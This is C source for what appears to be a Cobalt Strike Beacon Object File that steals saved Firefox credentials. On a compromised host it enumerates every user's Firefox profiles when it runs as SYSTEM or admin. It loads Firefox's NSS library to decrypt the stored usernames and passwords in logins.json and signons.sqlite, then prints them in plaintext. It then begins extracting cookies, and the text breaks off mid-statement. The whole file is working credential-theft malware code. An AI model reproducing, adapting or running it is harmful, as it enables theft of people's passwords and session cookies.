#include <windows.h>
#include "bofdefs.h"
#include "beacon.h"
#include "base.c"
#include <shlobj.h>

IMAGE_DOS_HEADER __ImageBase = {0x5A4D};

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileAttributesA(LPCSTR lpFileName);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);

DECLSPEC_IMPORT HRESULT WINAPI SHELL32$SHGetFolderPathA(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPSTR pszPath);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptStringToBinaryA(LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE* pbBinary, DWORD* pcbBinary, DWORD* pdwSkip, DWORD* pdwFlags);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptUnprotectData(DATA_BLOB* pDataIn, LPWSTR* ppszDataDescr, DATA_BLOB* pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct, DWORD dwFlags, DATA_BLOB* pDataOut);

DECLSPEC_IMPORT void* MSVCRT$memchr(const void* s, int c, size_t n);
DECLSPEC_IMPORT int MSVCRT$_strnicmp(const char* s1, const char* s2, size_t n);
DECLSPEC_IMPORT char* MSVCRT$strrchr(const char* s, int c);

typedef struct {
    int type;
    void* data;
    int len;
} TSECItem;

typedef int (*NSS_Init_t)(const char* configdir);
typedef int (*NSS_InitReadWrite_t)(const char* configdir);
typedef int (*NSS_Shutdown_t)(void);
typedef int (*PK11SDR_Decrypt_t)(TSECItem* data, TSECItem* result, int cx);

static NSS_Init_t p_NSS_Init = NULL;
static NSS_InitReadWrite_t p_NSS_InitReadWrite = NULL;
static NSS_Shutdown_t p_NSS_Shutdown = NULL;
static PK11SDR_Decrypt_t p_PK11SDR_Decrypt = NULL;
static HMODULE hNss3 = NULL;
static BOOL nssInitialized = FALSE;

typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
#define SQLITE_OK           0
#define SQLITE_ROW          100
#define SQLITE_DONE         101
#define SQLITE_OPEN_READONLY 0x00000001

typedef int (*sqlite3_open_v2_t)(const char *filename, sqlite3 **ppDb, int flags, const char *zVfs);
typedef const char* (*sqlite3_errmsg_t)(sqlite3 *db);
typedef int (*sqlite3_prepare_v2_t)(sqlite3 *db, const char *zSql, int nByte, sqlite3_stmt **ppStmt, const char **pzTail);
typedef int (*sqlite3_step_t)(sqlite3_stmt *pStmt);
typedef const unsigned char* (*sqlite3_column_text_t)(sqlite3_stmt *pStmt, int iCol);
typedef long long (*sqlite3_column_int64_t)(sqlite3_stmt *pStmt, int iCol);
typedef const void* (*sqlite3_column_blob_t)(sqlite3_stmt *pStmt, int iCol);
typedef int (*sqlite3_column_bytes_t)(sqlite3_stmt *pStmt, int iCol);
typedef int (*sqlite3_finalize_t)(sqlite3_stmt *pStmt);
typedef int (*sqlite3_close_t)(sqlite3 *db);

static sqlite3_open_v2_t p_sqlite3_open_v2 = NULL;
static sqlite3_errmsg_t p_sqlite3_errmsg = NULL;
static sqlite3_prepare_v2_t p_sqlite3_prepare_v2 = NULL;
static sqlite3_step_t p_sqlite3_step = NULL;
static sqlite3_column_text_t p_sqlite3_column_text = NULL;
static sqlite3_column_int64_t p_sqlite3_column_int64 = NULL;
static sqlite3_column_blob_t p_sqlite3_column_blob = NULL;
static sqlite3_column_bytes_t p_sqlite3_column_bytes = NULL;
static sqlite3_finalize_t p_sqlite3_finalize = NULL;
static sqlite3_close_t p_sqlite3_close = NULL;
static HMODULE hSqlite3 = NULL;

#ifndef CSIDL_APPDATA
#define CSIDL_APPDATA 0x001A
#endif
#ifndef SHGFP_TYPE_CURRENT
#define SHGFP_TYPE_CURRENT 0
#endif

#define MAX_ENTRIES_PER_TYPE        50
#define MAX_PATH_LEN                260
#define FIREFOX_BASE_PATH           "Mozilla\\Firefox\\Profiles"
#define MAX_PROFILES                10

static char profilePaths[MAX_PROFILES][MAX_PATH_LEN];
static int profileCount = 0;

#define SafeAppend internal_printf

#ifndef CRYPT_STRING_BASE64
#define CRYPT_STRING_BASE64 0x00000001
#endif

#define PROFILE_KEY_NONE    0
#define PROFILE_KEY3_DB     1
#define PROFILE_KEY4_DB     2

static BYTE* Base64Decode(const char* input, DWORD inputLen, DWORD* outputLen);
static BOOL DecryptWithNSS(const char* base64Encrypted, char** decrypted);

static int DetectKeyDatabase(const char* profilePath) {
    char pathBuf[MAX_PATH] = {0};

    MSVCRT$strcpy(pathBuf, profilePath);
    MSVCRT$strcat(pathBuf, "\\key4.db");
    if (KERNEL32$GetFileAttributesA(pathBuf) != INVALID_FILE_ATTRIBUTES) {
        return PROFILE_KEY4_DB;
    }

    MSVCRT$memset(pathBuf, 0, MAX_PATH);
    MSVCRT$strcpy(pathBuf, profilePath);
    MSVCRT$strcat(pathBuf, "\\key3.db");
    if (KERNEL32$GetFileAttributesA(pathBuf) != INVALID_FILE_ATTRIBUTES) {
        return PROFILE_KEY3_DB;
    }

    return PROFILE_KEY_NONE;
}

static BOOL HasLoginsJson(const char* profilePath) {
    char pathBuf[MAX_PATH] = {0};
    MSVCRT$strcpy(pathBuf, profilePath);
    MSVCRT$strcat(pathBuf, "\\logins.json");
    return (KERNEL32$GetFileAttributesA(pathBuf) != INVALID_FILE_ATTRIBUTES);
}

static BOOL HasSignonsSqlite(const char* profilePath) {
    char pathBuf[MAX_PATH] = {0};
    MSVCRT$strcpy(pathBuf, profilePath);
    MSVCRT$strcat(pathBuf, "\\signons.sqlite");
    return (KERNEL32$GetFileAttributesA(pathBuf) != INVALID_FILE_ATTRIBUTES);
}

static BOOL LoadSQLiteFunctions(void) {
    if (hSqlite3) {
        return TRUE;
    }

    hSqlite3 = KERNEL32$LoadLibraryA("winsqlite3.dll");
    if (!hSqlite3) {
        return FALSE;
    }

    p_sqlite3_open_v2 = (sqlite3_open_v2_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_open_v2");
    p_sqlite3_errmsg = (sqlite3_errmsg_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_errmsg");
    p_sqlite3_prepare_v2 = (sqlite3_prepare_v2_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_prepare_v2");
    p_sqlite3_step = (sqlite3_step_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_step");
    p_sqlite3_column_text = (sqlite3_column_text_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_column_text");
    p_sqlite3_column_int64 = (sqlite3_column_int64_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_column_int64");
    p_sqlite3_column_blob = (sqlite3_column_blob_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_column_blob");
    p_sqlite3_column_bytes = (sqlite3_column_bytes_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_column_bytes");
    p_sqlite3_finalize = (sqlite3_finalize_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_finalize");
    p_sqlite3_close = (sqlite3_close_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_close");

    if (!p_sqlite3_open_v2 || !p_sqlite3_errmsg || !p_sqlite3_prepare_v2 || !p_sqlite3_step ||
        !p_sqlite3_column_text || !p_sqlite3_column_int64 ||
        !p_sqlite3_column_blob || !p_sqlite3_column_bytes || !p_sqlite3_finalize || !p_sqlite3_close) {
        if (hSqlite3) {
            KERNEL32$FreeLibrary(hSqlite3);
            hSqlite3 = NULL;
        }
        return FALSE;
    }

    return TRUE;
}

static char* FindFirefoxInstallation(void) {
    char* firefoxPath = NULL;
    char nss3Path[MAX_PATH] = {0};
    char searchPath[MAX_PATH] = {0};
    WIN32_FIND_DATAA findData = {0};
    HANDLE hFind = INVALID_HANDLE_VALUE;

    char* possiblePaths[] = {
        "C:\\Program Files\\Mozilla Firefox",
        "C:\\Program Files (x86)\\Mozilla Firefox",
        "C:\\Program Files\\Firefox",
        "C:\\Program Files (x86)\\Firefox",
        "C:\\Program Files\\Mozilla Firefox ESR",
        "C:\\Program Files (x86)\\Mozilla Firefox ESR"
    };
    int pathCount = sizeof(possiblePaths) / sizeof(possiblePaths[0]);
    int i = 0;

    for (i = 0; i < pathCount; i++) {
        MSVCRT$strcpy(nss3Path, possiblePaths[i]);
        MSVCRT$strcat(nss3Path, "\\nss3.dll");
        if (KERNEL32$GetFileAttributesA(nss3Path) != INVALID_FILE_ATTRIBUTES) {
            firefoxPath = (char*)intAlloc(MSVCRT$strlen(possiblePaths[i]) + 1);
            if (firefoxPath) {
                MSVCRT$strcpy(firefoxPath, possiblePaths[i]);
            }
            return firefoxPath;
        }
    }

    MSVCRT$strcpy(searchPath, "C:\\Program Files\\Mozilla Firefox*");
    hFind = KERNEL32$FindFirstFileA(searchPath, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (MSVCRT$strcmp(findData.cFileName, ".") != 0 && MSVCRT$strcmp(findData.cFileName, "..") != 0) {
                    MSVCRT$strcpy(nss3Path, "C:\\Program Files\\");
                    MSVCRT$strcat(nss3Path, findData.cFileName);
                    MSVCRT$strcat(nss3Path, "\\nss3.dll");
                    if (KERNEL32$GetFileAttributesA(nss3Path) != INVALID_FILE_ATTRIBUTES) {
                        MSVCRT$strcpy(nss3Path, "C:\\Program Files\\");
                        MSVCRT$strcat(nss3Path, findData.cFileName);
                        firefoxPath = (char*)intAlloc(MSVCRT$strlen(nss3Path) + 1);
                        if (firefoxPath) {
                            MSVCRT$strcpy(firefoxPath, nss3Path);
                        }
                        KERNEL32$FindClose(hFind);
                        return firefoxPath;
                    }
                }
            }
        } while (KERNEL32$FindNextFileA(hFind, &findData));
        KERNEL32$FindClose(hFind);
    }

    MSVCRT$strcpy(searchPath, "C:\\Program Files (x86)\\Mozilla Firefox*");
    hFind = KERNEL32$FindFirstFileA(searchPath, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (MSVCRT$strcmp(findData.cFileName, ".") != 0 && MSVCRT$strcmp(findData.cFileName, "..") != 0) {
                    MSVCRT$strcpy(nss3Path, "C:\\Program Files (x86)\\");
                    MSVCRT$strcat(nss3Path, findData.cFileName);
                    MSVCRT$strcat(nss3Path, "\\nss3.dll");
                    if (KERNEL32$GetFileAttributesA(nss3Path) != INVALID_FILE_ATTRIBUTES) {
                        MSVCRT$strcpy(nss3Path, "C:\\Program Files (x86)\\");
                        MSVCRT$strcat(nss3Path, findData.cFileName);
                        firefoxPath = (char*)intAlloc(MSVCRT$strlen(nss3Path) + 1);
                        if (firefoxPath) {
                            MSVCRT$strcpy(firefoxPath, nss3Path);
                        }
                        KERNEL32$FindClose(hFind);
                        return firefoxPath;
                    }
                }
            }
        } while (KERNEL32$FindNextFileA(hFind, &findData));
        KERNEL32$FindClose(hFind);
    }

    return NULL;
}

static BOOL LoadNSSLibraries(const char* firefoxPath) {
    char dllPath[MAX_PATH] = {0};
    HMODULE hNss3Temp = NULL;
    HMODULE hLoaded = NULL;
    int i = 0;

    if (!firefoxPath) {
        return FALSE;
    }

    char* dependencies[] = {
        "mozglue.dll",
        "nssutil3.dll",
        "nspr4.dll",
        "plc4.dll",
        "plds4.dll",
        "softokn3.dll",
        "freebl3.dll"
    };

    for (i = 0; i < (int)(sizeof(dependencies) / sizeof(dependencies[0])); i++) {
        MSVCRT$strcpy(dllPath, firefoxPath);
        MSVCRT$strcat(dllPath, "\\");
        MSVCRT$strcat(dllPath, dependencies[i]);
        hLoaded = KERNEL32$LoadLibraryA(dllPath);
        (void)hLoaded;
    }

    MSVCRT$strcpy(dllPath, firefoxPath);
    MSVCRT$strcat(dllPath, "\\nss3.dll");

    hNss3Temp = KERNEL32$LoadLibraryA(dllPath);
    if (!hNss3Temp) {
        return FALSE;
    }

    if (hNss3) {
        KERNEL32$FreeLibrary(hNss3);
    }

    hNss3 = hNss3Temp;

    p_NSS_Init = (NSS_Init_t)KERNEL32$GetProcAddress(hNss3, "NSS_Init");
    p_NSS_InitReadWrite = (NSS_InitReadWrite_t)KERNEL32$GetProcAddress(hNss3, "NSS_InitReadWrite");
    p_NSS_Shutdown = (NSS_Shutdown_t)KERNEL32$GetProcAddress(hNss3, "NSS_Shutdown");
    p_PK11SDR_Decrypt = (PK11SDR_Decrypt_t)KERNEL32$GetProcAddress(hNss3, "PK11SDR_Decrypt");

    if ((!p_NSS_Init && !p_NSS_InitReadWrite) || !p_NSS_Shutdown || !p_PK11SDR_Decrypt) {
        if (hNss3) {
            KERNEL32$FreeLibrary(hNss3);
            hNss3 = NULL;
        }
        return FALSE;
    }

    return TRUE;
}

static BOOL InitializeNSS(const char* profilePath) {
    char* firefoxPath = NULL;
    int result = 0;

    if (nssInitialized && p_NSS_Shutdown) {
        p_NSS_Shutdown();
        nssInitialized = FALSE;
    }

    if (!hNss3 || (!p_NSS_Init && !p_NSS_InitReadWrite) || !p_PK11SDR_Decrypt) {
        firefoxPath = FindFirefoxInstallation();
        if (!firefoxPath) {
            return FALSE;
        }

        if (!LoadNSSLibraries(firefoxPath)) {
            if (firefoxPath) intFree(firefoxPath);
            return FALSE;
        }

        if (firefoxPath) intFree(firefoxPath);
    }

    if (p_NSS_InitReadWrite) {
        result = p_NSS_InitReadWrite(profilePath);
        if (result == 0) {
            nssInitialized = TRUE;
            return TRUE;
        }
    }

    if (p_NSS_Init) {
        result = p_NSS_Init(profilePath);
        nssInitialized = (result == 0);
    }

    return nssInitialized;
}

static BOOL DecryptWithNSS(const char* base64Encrypted, char** decrypted) {
    BYTE* pbEncrypted = NULL;
    DWORD dwEncrypted = 0;
    TSECItem data = {0};
    TSECItem result = {0};
    char* pszResult = NULL;
    BOOL bResult = FALSE;

    if (!nssInitialized || !p_PK11SDR_Decrypt) {
        return FALSE;
    }

    pbEncrypted = Base64Decode(base64Encrypted, (DWORD)MSVCRT$strlen(base64Encrypted), &dwEncrypted);
    if (!pbEncrypted || dwEncrypted == 0) {
        return FALSE;
    }

    data.type = 0;
    data.data = pbEncrypted;
    data.len = (int)dwEncrypted;

    result.type = 0;
    result.data = NULL;
    result.len = 0;

    if (p_PK11SDR_Decrypt(&data, &result, 0) == 0 && result.len > 0) {
        pszResult = (char*)intAlloc(result.len + 1);
        if (pszResult) {
            MSVCRT$memcpy(pszResult, result.data, result.len);
            pszResult[result.len] = '\0';
            *decrypted = pszResult;
            bResult = TRUE;
        }
    }

    intFree(pbEncrypted);
    return bResult;
}

static BOOL ReadFileFromDisk(const char* filePath, BYTE** buffer, DWORD* size) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD bytesRead = 0;

    *buffer = NULL;
    *size = 0;

    hFile = KERNEL32$CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    *size = KERNEL32$GetFileSize(hFile, NULL);
    if (*size == INVALID_FILE_SIZE || *size == 0) {
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    *buffer = (BYTE*)intAlloc(*size);
    if (!*buffer) {
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    if (!KERNEL32$ReadFile(hFile, *buffer, *size, &bytesRead, NULL) || bytesRead != *size) {
        intFree(*buffer);
        *buffer = NULL;
        *size = 0;
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    KERNEL32$CloseHandle(hFile);
    return TRUE;
}

static BOOL FindFirefoxProfilesForUser(const char* userAppDataPath) {
    char searchPath[MAX_PATH] = {0};
    WIN32_FIND_DATAA findData = {0};
    HANDLE hFind = INVALID_HANDLE_VALUE;
    BOOL found = FALSE;

    if (MSVCRT$strlen(userAppDataPath) + MSVCRT$strlen(FIREFOX_BASE_PATH) + 20 >= sizeof(searchPath)) {
        return FALSE;
    }

    MSVCRT$strcpy(searchPath, userAppDataPath);
    MSVCRT$strcat(searchPath, "\\");
    MSVCRT$strcat(searchPath, FIREFOX_BASE_PATH);
    MSVCRT$strcat(searchPath, "\\*");

    hFind = KERNEL32$FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (MSVCRT$strcmp(findData.cFileName, ".") != 0 && MSVCRT$strcmp(findData.cFileName, "..") != 0) {
                if (profileCount < MAX_PROFILES) {
                    MSVCRT$strcpy(profilePaths[profileCount], userAppDataPath);
                    MSVCRT$strcat(profilePaths[profileCount], "\\");
                    MSVCRT$strcat(profilePaths[profileCount], FIREFOX_BASE_PATH);
                    MSVCRT$strcat(profilePaths[profileCount], "\\");
                    MSVCRT$strcat(profilePaths[profileCount], findData.cFileName);
                    profileCount++;
                    found = TRUE;
                }
            }
        }
    } while (KERNEL32$FindNextFileA(hFind, &findData) && profileCount < MAX_PROFILES);

    KERNEL32$FindClose(hFind);
    return found;
}

static BOOL FindAllFirefoxProfiles(void) {
    char appDataPath[MAX_PATH] = {0};
    char usersPath[MAX_PATH] = "C:\\Users";
    char userPath[MAX_PATH] = {0};
    char userAppDataPath[MAX_PATH] = {0};
    WIN32_FIND_DATAA findData = {0};
    HANDLE hFind = INVALID_HANDLE_VALUE;
    BOOL found = FALSE;
    BOOL isSystem = FALSE;
    BOOL isAdmin = FALSE;

    profileCount = 0;

    isAdmin = BeaconIsAdmin();

    typedef DWORD (WINAPI *GetEnvironmentVariableA_t)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
    HMODULE hKernel32 = (HMODULE)KERNEL32$GetModuleHandleA("kernel32.dll");
    GetEnvironmentVariableA_t pGetEnvironmentVariableA = NULL;
    if (hKernel32) {
        pGetEnvironmentVariableA = (GetEnvironmentVariableA_t)KERNEL32$GetProcAddress(hKernel32, "GetEnvironmentVariableA");
    }

    if (pGetEnvironmentVariableA) {
        char username[64] = {0};
        if (pGetEnvironmentVariableA("USERNAME", username, sizeof(username)) > 0) {
            if (MSVCRT$_stricmp(username, "SYSTEM") == 0) {
                isSystem = TRUE;
            }
        }
    }

    if (isSystem || isAdmin) {
        char searchPath[MAX_PATH] = {0};
        MSVCRT$strcpy(searchPath, usersPath);
        MSVCRT$strcat(searchPath, "\\*");

        hFind = KERNEL32$FindFirstFileA(searchPath, &findData);
        if (hFind == INVALID_HANDLE_VALUE) {
            if (SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appDataPath) == S_OK) {
                return FindFirefoxProfilesForUser(appDataPath);
            }
            return FALSE;
        }

        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (MSVCRT$strcmp(findData.cFileName, ".") == 0 || MSVCRT$strcmp(findData.cFileName, "..") == 0) {
                    continue;
                }

                if (MSVCRT$_stricmp(findData.cFileName, "Public") == 0 ||
                    MSVCRT$_stricmp(findData.cFileName, "Default") == 0 ||
                    MSVCRT$_stricmp(findData.cFileName, "Default User") == 0) {
                    continue;
                }

                MSVCRT$strcpy(userPath, usersPath);
                MSVCRT$strcat(userPath, "\\");
                MSVCRT$strcat(userPath, findData.cFileName);
                MSVCRT$strcat(userPath, "\\AppData\\Roaming");

                if (KERNEL32$GetFileAttributesA(userPath) != INVALID_FILE_ATTRIBUTES) {
                    MSVCRT$strcpy(userAppDataPath, userPath);
                    if (FindFirefoxProfilesForUser(userAppDataPath)) {
                        found = TRUE;
                    }
                }
            }
        } while (KERNEL32$FindNextFileA(hFind, &findData) && profileCount < MAX_PROFILES);

        KERNEL32$FindClose(hFind);
    } else {
        if (SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appDataPath) == S_OK) {
            found = FindFirefoxProfilesForUser(appDataPath);
        }
    }

    return found;
}

static BYTE* Base64Decode(const char* input, DWORD inputLen, DWORD* outputLen) {
    DWORD dwOutput = 0;
    BYTE* pbOutput = NULL;

    if (!input || inputLen == 0 || !outputLen) {
        return NULL;
    }

    *outputLen = 0;

    if (!CRYPT32$CryptStringToBinaryA(input, inputLen, CRYPT_STRING_BASE64, NULL, &dwOutput, NULL, NULL)) {
        return NULL;
    }

    pbOutput = (BYTE*)intAlloc(dwOutput);
    if (!pbOutput) {
        return NULL;
    }

    if (!CRYPT32$CryptStringToBinaryA(input, inputLen, CRYPT_STRING_BASE64, pbOutput, &dwOutput, NULL, NULL)) {
        intFree(pbOutput);
        return NULL;
    }

    *outputLen = dwOutput;
    return pbOutput;
}

static BOOL DecryptFirefoxSecret(const char* pszBase64Encrypted, char** ppszDecrypted, const char* profilePath) {
    char* pszResult = NULL;

    if (!pszBase64Encrypted || !ppszDecrypted) {
        return FALSE;
    }

    *ppszDecrypted = NULL;

    if (nssInitialized && p_PK11SDR_Decrypt) {
        if (DecryptWithNSS(pszBase64Encrypted, &pszResult)) {
            *ppszDecrypted = pszResult;
            return TRUE;
        }
    }

    return FALSE;
}

static char* FindJsonStringValue(const char* json, DWORD jsonLen, const char* key, DWORD* valueLen) {
    char searchKey[256] = {0};
    const char* jsonEnd = NULL;
    const char* keyStart = NULL;
    const char* valueStart = NULL;
    const char* valueEnd = NULL;
    DWORD keyLen = 0;

    if (!json || !key || !valueLen) {
        return NULL;
    }

    *valueLen = 0;
    jsonEnd = json + jsonLen;

    MSVCRT$sprintf(searchKey, "\"%s\"", key);
    keyLen = (DWORD)MSVCRT$strlen(searchKey);

    keyStart = json;
    while (keyStart < jsonEnd - keyLen) {
        keyStart = (const char*)MSVCRT$memchr(keyStart, '"', jsonEnd - keyStart);
        if (!keyStart) {
            return NULL;
        }

        if (MSVCRT$_strnicmp(keyStart, searchKey, keyLen) == 0) {
            break;
        }

        keyStart++;
    }

    if (!keyStart || keyStart >= jsonEnd - keyLen) {
        return NULL;
    }

    keyStart += keyLen;

    while (keyStart < jsonEnd && (*keyStart == ' ' || *keyStart == '\t' || *keyStart == '\n' || *keyStart == '\r')) {
        keyStart++;
    }

    if (keyStart >= jsonEnd || *keyStart != ':') {
        return NULL;
    }

    keyStart++;

    while (keyStart < jsonEnd && (*keyStart == ' ' || *keyStart == '\t' || *keyStart == '\n' || *keyStart == '\r')) {
        keyStart++;
    }

    if (keyStart >= jsonEnd || *keyStart != '"') {
        return NULL;
    }

    valueStart = keyStart + 1;
    valueEnd = (const char*)MSVCRT$memchr(valueStart, '"', jsonEnd - valueStart);
    if (!valueEnd || valueEnd >= jsonEnd) {
        return NULL;
    }

    *valueLen = (DWORD)(valueEnd - valueStart);
    return (char*)valueStart;
}

static char* FindJsonArrayValue(const char* json, DWORD jsonLen, const char* key, DWORD* arrayLen) {
    char searchKey[256] = {0};
    const char* jsonEnd = NULL;
    const char* keyStart = NULL;
    const char* arrayStart = NULL;
    const char* arrayEnd = NULL;
    DWORD keyLen = 0;
    int bracketCount = 0;

    if (!json || !key || !arrayLen) {
        return NULL;
    }

    *arrayLen = 0;
    jsonEnd = json + jsonLen;

    MSVCRT$sprintf(searchKey, "\"%s\"", key);
    keyLen = (DWORD)MSVCRT$strlen(searchKey);

    keyStart = json;
    while (keyStart < jsonEnd - keyLen) {
        keyStart = (const char*)MSVCRT$memchr(keyStart, '"', jsonEnd - keyStart);
        if (!keyStart) {
            return NULL;
        }

        if (MSVCRT$_strnicmp(keyStart, searchKey, keyLen) == 0) {
            break;
        }

        keyStart++;
    }

    if (!keyStart || keyStart >= jsonEnd - keyLen) {
        return NULL;
    }

    keyStart += keyLen;

    while (keyStart < jsonEnd && (*keyStart == ' ' || *keyStart == '\t' || *keyStart == '\n' || *keyStart == '\r')) {
        keyStart++;
    }

    if (keyStart >= jsonEnd || *keyStart != ':') {
        return NULL;
    }

    keyStart++;

    while (keyStart < jsonEnd && (*keyStart == ' ' || *keyStart == '\t' || *keyStart == '\n' || *keyStart == '\r')) {
        keyStart++;
    }

    if (keyStart >= jsonEnd || *keyStart != '[') {
        return NULL;
    }

    arrayStart = keyStart + 1;
    arrayEnd = arrayStart;
    bracketCount = 1;

    while (arrayEnd < jsonEnd && bracketCount > 0) {
        if (*arrayEnd == '[') {
            bracketCount++;
        } else if (*arrayEnd == ']') {
            bracketCount--;
        }
        arrayEnd++;
    }

    if (bracketCount != 0) {
        return NULL;
    }

    arrayEnd--;

    *arrayLen = (DWORD)(arrayEnd - arrayStart);
    return (char*)arrayStart;
}

static void DecryptAndPrint(const char* label, const char* encrypted, DWORD encLen, const char* profilePath, BOOL nssReady) {
    char* decrypted = NULL;

    if (nssReady && DecryptFirefoxSecret(encrypted, &decrypted, profilePath)) {
        SafeAppend(" | %s: %s", label, decrypted);
        if (decrypted) intFree(decrypted);
    } else {
        char tmp[256] = {0};
        int copyLen = encLen < 255 ? encLen : 255;
        MSVCRT$memcpy(tmp, encrypted, copyLen);
        tmp[copyLen] = '\0';
        SafeAppend(" | %s (encrypted): %s", label, tmp);
    }
}

static BOOL ExtractPasswordsFromLoginsJson(const char* loginsJsonPath, const char* profilePath, BOOL nssReady) {
    BYTE* fileContent = NULL;
    DWORD fileSize = 0;
    int count = 0;
    const char* loginsArray = NULL;
    DWORD loginsArrayLen = 0;
    const char* cursor = NULL;

    if (!ReadFileFromDisk(loginsJsonPath, &fileContent, &fileSize)) {
        SafeAppend("[!] Failed to read logins.json\n");
        return FALSE;
    }

    SafeAppend("\n[+] Saved Passwords (logins.json):\n");
    SafeAppend("================================\n");

    loginsArray = FindJsonArrayValue((char*)fileContent, fileSize, "logins", &loginsArrayLen);
    if (!loginsArray || loginsArrayLen == 0) {
        SafeAppend("[!] No logins array found or array is empty\n");
        intFree(fileContent);
        return FALSE;
    }

    cursor = loginsArray;
    while (count < MAX_ENTRIES_PER_TYPE && cursor < loginsArray + loginsArrayLen) {
        const char* hostnamePos = MSVCRT$strstr(cursor, "\"hostname\"");
        if (!hostnamePos || hostnamePos >= loginsArray + loginsArrayLen) {
            break;
        }

        DWORD remaining = (DWORD)(loginsArrayLen - (hostnamePos - loginsArray));
        DWORD hostnameLen = 0;
        DWORD usernameLen = 0;
        DWORD passwordLen = 0;

        char* hostname = FindJsonStringValue(hostnamePos, remaining, "hostname", &hostnameLen);
        if (!hostname || hostnameLen == 0) {
            cursor = hostnamePos + 1;
            continue;
        }

        char* username = FindJsonStringValue(hostnamePos, remaining, "encryptedUsername", &usernameLen);
        char* password = FindJsonStringValue(hostnamePos, remaining, "encryptedPassword", &passwordLen);

        if (!username || usernameLen == 0) {
            cursor = hostnamePos + 1;
            continue;
        }

        if (!password || passwordLen == 0) {
            cursor = hostnamePos + 1;
            continue;
        }

        char hostnameStr[512] = {0};
        DWORD copyLen = hostnameLen < 511 ? hostnameLen : 511;
        MSVCRT$memcpy(hostnameStr, hostname, copyLen);
        hostnameStr[copyLen] = '\0';

        SafeAppend("URL: %s", hostnameStr);
        DecryptAndPrint("Username", username, usernameLen, profilePath, nssReady);
        DecryptAndPrint("Password", password, passwordLen, profilePath, nssReady);
        SafeAppend("\n");

        count++;
        cursor = hostnamePos + 1;
    }

    if (count == 0) {
        SafeAppend("[!] No password entries found in logins.json\n");
    } else {
        SafeAppend("\n[+] Found %d password entries\n", count);
    }

    intFree(fileContent);
    return (count > 0);
}

static BOOL ExtractPasswordsFromSignonsSqlite(const char* profilePath, BOOL nssReady) {
    char dbPath[MAX_PATH] = {0};
    sqlite3* db = NULL;
    sqlite3_stmt* stmt = NULL;
    int result = 0;
    int count = 0;

    if (!p_sqlite3_open_v2) {
        SafeAppend("[!] SQLite not available - cannot read signons.sqlite\n");
        return FALSE;
    }

    MSVCRT$strcpy(dbPath, profilePath);
    MSVCRT$strcat(dbPath, "\\signons.sqlite");

    result = p_sqlite3_open_v2(dbPath, &db, SQLITE_OPEN_READONLY, NULL);
    if (result != SQLITE_OK) {
        SafeAppend("[!] Failed to open signons.sqlite\n");
        return FALSE;
    }

    result = p_sqlite3_prepare_v2(db, "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins", -1, &stmt, NULL);
    if (result != SQLITE_OK) {
        p_sqlite3_close(db);
        return FALSE;
    }

    SafeAppend("\n[+] Saved Passwords (signons.sqlite - legacy):\n");
    SafeAppend("================================\n");

    while ((result = p_sqlite3_step(stmt)) == SQLITE_ROW && count < MAX_ENTRIES_PER_TYPE) {
        const char* hostname = (const char*)p_sqlite3_column_text(stmt, 0);
        const char* username = (const char*)p_sqlite3_column_text(stmt, 1);
        const char* password = (const char*)p_sqlite3_column_text(stmt, 2);

        SafeAppend("URL: %s", hostname ? hostname : "");
        if (username && MSVCRT$strlen(username) > 0) {
            DecryptAndPrint("Username", username, (DWORD)MSVCRT$strlen(username), profilePath, nssReady);
        }
        if (password && MSVCRT$strlen(password) > 0) {
            DecryptAndPrint("Password", password, (DWORD)MSVCRT$strlen(password), profilePath, nssReady);
        }
        SafeAppend("\n");
        count++;
    }

    if (count == 0) {
        SafeAppend("[!] No password entries found in signons.sqlite\n");
    } else {
        SafeAppend("\n[+] Found %d password entries\n", count);
    }

    if (stmt) p_sqlite3_finalize(stmt);
    if (db) p_sqlite3_close(db);
    return (count > 0);
}

static BOOL ExtractCookies(const char* cookiesDbPath, const char* profilePath, BOOL nssReady) {
    sqlite3* db = NULL;
    sqlite3_stmt* stmt = NULL;
    int result = 0;
    int count = 0;

    if (!p_sqlite3_open_v2) {
        return FALSE;
    }

    result = p_sqlite3_open_v2(cookiesDbPath, &db, SQLITE_OPEN_READONLY, NULL);
    if (result != SQLITE_OK) {
        return FALSE;
    }

    result = p_sqlite3_prepare_v2(db,
